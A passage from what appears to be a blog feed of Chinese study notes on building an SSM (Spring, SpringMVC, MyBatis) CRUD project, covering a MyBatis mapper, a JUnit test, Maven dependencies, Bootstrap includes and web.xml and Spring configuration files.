class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"gender != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        gender = #</span><span class="template-variable">&#123;gender,jdbcType=CHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"email != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        email = #</span><span class="template-variable">&#123;email,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"dId != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        d_id = #</span><span class="template-variable">&#123;dId,jdbcType=INTEGER&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span></span><br><span class="line"><span class="xml">    where emp_id = #</span><span class="template-variable">&#123;empId,jdbcType=INTEGER&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">"updateByPrimaryKey"</span> <span class="attr">parameterType</span>=<span class="string">"com.ceit.crud.bean.Employee"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    update tbl_emp</span></span><br><span class="line"><span class="xml">    set emp_name = #</span><span class="template-variable">&#123;empName,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      gender = #</span><span class="template-variable">&#123;gender,jdbcType=CHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      email = #</span><span class="template-variable">&#123;email,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      d_id = #</span><span class="template-variable">&#123;dId,jdbcType=INTEGER&#125;</span></span><br><span class="line"><span class="xml">    where emp_id = #</span><span class="template-variable">&#123;empId,jdbcType=INTEGER&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><p>接下来就创建一个MapperTest.java来简单测试一下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.crud.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.Department;</span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.DepartmentExample;</span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.dao.DepartmentMapper;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.ContextConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringJUnit4ClassRunner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapperTest</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试DepartmentMapper</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCRUD</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//1.创建SpringIOC容器</span></span><br><span class="line">        ApplicationContext ioc=<span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"applicationContext.xml"</span>);</span><br><span class="line">        <span class="comment">//2.从容器中获取mapper</span></span><br><span class="line">        DepartmentMapper bean = ioc.getBean(DepartmentMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(bean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.插入几个部门</span></span><br><span class="line">        bean.insertSelective(<span class="keyword">new</span> Department(<span class="keyword">null</span>,<span class="string">"开发部"</span>));</span><br><span class="line">        bean.insertSelective(<span class="keyword">new</span> Department(<span class="keyword">null</span>,<span class="string">"测试部"</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>运行完成后，查看数据库已经发生变化，插入成功</p>
<p>剩下的基本上就是基本操作了</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>SSM</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>SSM-2020/9/17-环境搭建</title>
    <url>/2020/09/17/SSM-2020-9-17-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="基础环境搭建"><a href="#基础环境搭建" class="headerlink" title="基础环境搭建"></a>基础环境搭建</h1><ol>
<li><p>创建一个maven工程</p>
</li>
<li><p>引入项目依赖的jar包</p>
<ul>
<li>spring</li>
<li>springmvc</li>
<li>mybatis</li>
<li>数据库连接池，驱动包</li>
<li>其他(jstl,servlet-api,junit)</li>
</ul>
</li>
<li><p>引入bootstrap前端框架</p>
</li>
<li><p>编写ssm整合的关键配置文件</p>
<ul>
<li>web.xml,spring,springmvc,mybatis,使用mybatis的逆向工程生成对应的bean以及mapper</li>
</ul>
</li>
</ol>
<h2 id="jar包导入"><a href="#jar包导入" class="headerlink" title="jar包导入"></a>jar包导入</h2><p>在pom.xml文件中加载依赖<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 引入项目依赖的jar包--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- SpringMVC Spring Mybatis   --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--spring mvc--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--spring jdbc--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- spring面向切面编程--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aspects<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--MyBatis--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--MyBatis整合Spring的适配包 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--数据库连接池--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--MySQL的驱动--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--JSTL--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--servlet-api--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><br>注意：servlet-api服务器中是存在的，但是一般都写上该依赖，并且使用<code>&lt;scope&gt;provided&lt;/scope&gt;</code>这样在服务器中的时候，该jar包就会被自动剔除掉</p>
<h2 id="引入bootstarp"><a href="#引入bootstarp" class="headerlink" title="引入bootstarp"></a>引入bootstarp</h2><p>下载好bootstarp后，在webapp下创建一个文件夹名为static,并将解压好的bootstarp文件放进去<br><img src="/img/JavaWeb/9-17学习日记/0.png" alt="avatar"></p>
<p>引入bootstarp样式：<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;link <span class="attribute">href</span>=<span class="string">"https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css"</span> <span class="attribute">rel</span>=<span class="string">"stylesheet"</span>&gt;</span><br></pre></td></tr></table></figure><br>同时别忘了根据自己的目录结构修改地址</p>
<p>引入js文件：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>同样根据自己的目录结构修改地址</p>
<p>引入Jquery文件：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>由于bootstarp是基于Jquery的，所以必须引入，官网下载之后，根据目录修改地址</p>
<p><img src="/img/JavaWeb/9-17学习日记/1.png" alt="avatar"></p>
<p>在引入bootstarp后，可以很快速和很美观的做出一个页面，例如按钮<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-info"</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/img/JavaWeb/9-17学习日记/2.png" alt="avatar"></p>
<p>就可以做出一个美观大气的按钮，更多具体样式可以参考bootstarp的全局样式文档<br><a href="https://v3.bootcss.com/css/" target="_blank" rel="noopener">https://v3.bootcss.com/css/</a></p>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><h3 id="web-xml文件"><a href="#web-xml文件" class="headerlink" title="web.xml文件"></a>web.xml文件</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--1.启动Spring的容器  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 2.spring mvc的前端控制器，拦截所有请求--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--  3.字符编码过滤器  一定要放在所有过滤器之前--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>utf-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceRequestEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceResponseEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 4.使用Rest风格的URI  将页面普通的POST请求转为指定的delete或put请求 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>hiddenHttpMethodFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.HiddenHttpMethodFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>hiddenHttpMethodFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="Springmvc配置文件"><a href="#Springmvc配置文件" class="headerlink" title="Springmvc配置文件"></a>Springmvc配置文件</h3><p>dispatcherServlet-servlet.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">"http://www.springframework.org/schema/mvc"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    SpringMVC的配置文件，包含网站跳转逻辑的控制，配置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.ceit"</span> <span class="attr">use-default-filters</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  只扫描控制器      --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">"annotation"</span> <span class="attr">expression</span>=<span class="string">"org.springframework.stereotype.Controller"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--  配置视图解析器，方便页面返回      --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/views/"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 两个标准配置   --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 将springmvc不能处理的请求交给tomcat   --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 能支持springmvc更高级的一些功能，快捷的ajax...映射动态请求   --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="Spring配置文件"><a href="#Spring配置文件" class="headerlink" title="Spring配置文件"></a>Spring配置文件</h3><p>applicationContext.xml<br><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span></span><br><span class="line"><span class="xml">       xmlns:context="http://www.springframework.org/schema/context"</span></span><br><span class="line"><span class="xml">       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</span></span><br><span class="line"><span class="xml">       xmlns:aop="http://www.springframework.org/schema/aop"</span></span><br><span class="line"><span class="xml">       xmlns:tx="http://www.springframework.org/schema/tx"</span></span><br><span class="line"><span class="xml">       xmlns:p="http://www.springframework.org/schema/p"</span></span><br><span class="line"><span class="xml">       xsi:schemaLocation="</span></span><br><span class="line"><span class="xml">                    http://www.springframework.org/schema/context</span></span><br><span class="line"><span class="xml">                    http://www.springframework.org/schema/context/spring-context.xsd</span></span><br><span class="line"><span class="xml">                    http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="xml">                    http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="line"><span class="xml">                    http://www.springframework.org/schema/tx</span></span><br><span class="line"><span class="xml">                    http://www.springframework.org/schema/tx/spring-tx.xsd</span></span><br><span class="line"><span class="xml">                    http://www.springframework.org/schema/aop</span></span><br><span class="line"><span class="xml">                    http://www.springframework.org/schema/aop/spring-aop.xsd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.ceit"</span> &gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">context:exclude-filter</span> <span class="attr">type</span>=<span class="string">"annotation"</span> <span class="attr">expression</span>=<span class="string">"org.springframework.stereotype.Controller"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- Spring的配置文件，主要配置与业务逻辑有关的   --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--数据源，事务控制 ...--&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">"classpath:dbconfig.properties"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pooleDataSource"</span> <span class="attr">class</span>=<span class="string">"com.mchange.v2.c3p0.ComboPooledDataSource"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"jdbcUrl"</span>  <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;jdbc.jdbcUrl&#125;</span><span class="xml"><span 